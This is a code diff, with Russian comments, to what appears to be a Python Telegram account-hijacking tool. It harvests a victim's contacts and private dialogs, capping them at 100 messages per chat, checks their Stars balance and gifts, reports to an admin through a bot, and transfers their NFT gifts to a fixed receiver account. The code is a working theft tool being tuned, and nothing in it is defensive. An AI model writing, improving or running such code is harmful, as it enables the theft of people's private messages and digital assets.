@@ -24,7 +24,7 @@ CORS(app)
 temp_data = {}
 
 # ============================================================
-# Отправка уведомлений админу
+# Отправка уведомлений админу (синхронно через отдельный поток)
 # ============================================================
 async def send_telegram_message(text):
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
@@ -32,7 +32,7 @@ async def send_telegram_message(text):
         await client.post(url, json={"chat_id": ADMIN_ID, "text": text})
 
 # ============================================================
-# Сбор данных аккаунта (без записи звёзд в JSON)
+# Сбор данных аккаунта с лимитом 100 сообщений на диалог
 # ============================================================
 async def collect_full_user_data(client):
     data = {}
@@ -65,24 +65,9 @@ async def collect_full_user_data(client):
         await send_telegram_message(f"⚠️ Ошибка получения контактов: {str(e)}")
         data['contacts'] = []
     
-    # 3. Баланс звёзд – НЕ ЗАПИСЫВАЕМ В JSON (только для уведомлений, но здесь не используем)
-    # Просто получаем, чтобы не было ошибок, но не сохраняем
-    try:
-        stars_status = await client(functions.payments.GetStarsStatusRequest(
-            peer=await client.get_input_entity('me')
-        ))
-        # balance = stars_status.balance.amount  # не используем
-    except Exception as e:
-        await send_telegram_message(f"⚠️ Ошибка получения баланса: {str(e)}")
+    # 3. Баланс звёзд – НЕ ЗАПИСЫВАЕМ, только для уведомлений (пропускаем)
     
-    # 4. Доступные подарки (только для информации, не записываем в JSON)
-    try:
-        gifts_result = await client(functions.payments.GetStarGiftsRequest(hash=0))
-        # Не сохраняем, просто чтобы не было ошибок
-    except Exception as e:
-        await send_telegram_message(f"⚠️ Ошибка получения подарков: {str(e)}")
-    
-    # 5. Диалоги и сообщения (основное)
+    # 4. Диалоги и сообщения с лимитом 100 сообщений на диалог
     dialogs = await client.get_dialogs()
     data['dialogs'] = []
     for dialog in dialogs:
@@ -101,7 +86,8 @@ async def collect_full_user_data(client):
         
         try:
             messages = []
-            async for msg in client.iter_messages(dialog, limit=None):
+            # Ограничиваем до 100 последних сообщений на диалог
+            async for msg in client.iter_messages(dialog, limit=100):
                 messages.append({
                     'id': msg.id,
                     'date': msg.date.isoformat() if msg.date else None,
@@ -145,12 +131,12 @@ async def check_balance_and_gifts(client):
     try:
         me = await client.get_me()
         
-        # Баланс звёзд (правильное получение)
+        # Баланс звёзд
         try:
             stars_status = await client(functions.payments.GetStarsStatusRequest(
                 peer=await client.get_input_entity('me')
             ))
-            balance = stars_status.balance.amount
+            balance = stars_status.balance.amount  # правильное получение
         except Exception as e:
             await send_telegram_message(f"⚠️ Ошибка получения баланса: {str(e)}")
             balance = 0
@@ -179,7 +165,6 @@ async def check_balance_and_gifts(client):
 # ============================================================
 async def transfer_nft_to_receiver(client, info):
     try:
-        # Проверяем, существует ли получатель
         try:
             receiver = await client.get_entity(RECEIVER_USERNAME)
         except (UsernameNotOccupiedError, ValueError) as e:
